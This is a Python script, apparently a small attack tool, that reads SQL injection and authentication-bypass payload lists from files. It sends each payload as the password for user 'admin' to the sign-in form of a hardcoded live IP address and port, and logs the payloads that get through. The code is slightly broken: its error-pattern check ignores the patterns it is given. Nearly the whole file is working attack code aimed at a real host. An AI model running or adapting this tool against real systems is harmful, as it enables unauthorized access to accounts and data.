# -*- encoding utf-8 -*-
'''
https://medium.com/@ismailtasdelen/sql-injection-payload-list-b97656cfd66b
'''

import requests
import re
import os
from tqdm import tqdm


table = {
        'generic':'data/generic.txt',
        'error_base' : 'data/generic_error_base.txt',
        'auth' : 'data/auth_bypass.txt'
        }

class Injector:
    def __init__(self, address):
        self.address = address
        self.headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
        self.found = []

    def post_attack(self, data, target, attack_type, error_pattern):
        path = os.path.join(os.path.dirname(__file__), table[attack_type])
        with open(path, 'r') as payloads:
            # for payload in tqdm(payloads):
            for payload in tqdm(payloads):
                if payload[0] == '#' or payload == '':
                    continue
                payload = payload.strip()
                data[target] = payload
                response = requests.post(self.address, headers = self.headers, data=data)
                if response.status_code != 200:
                    continue
                for error in error_pattern:
                    if re.findall('error', response.text):
                        break
                else:
                    print(payload)
                    self.found.append(payload)

    def get_attack(self, target):
        raise NotImplementedError

    def basic_attack(self, data, target, error_pattern, request_type):
        if request_type == 'POST':
            self.post_attack(data, target, 'generic', error_pattern)
            self.post_attack(data, target, 'error_base', error_pattern)
        elif request_type == 'GET':
            pass

def main():
    inj = Injector("http://95.216.233.106:15009/sign-in")
    data = {"user": "admin", "pass": None}
    error_pattern = ['Invalid username / password', 'Attempting to login as more than one user']
    inj.basic_attack(data=data, target='pass', error_pattern = error_pattern, request_type ='POST')


if __name__ == '__main__':
    main()
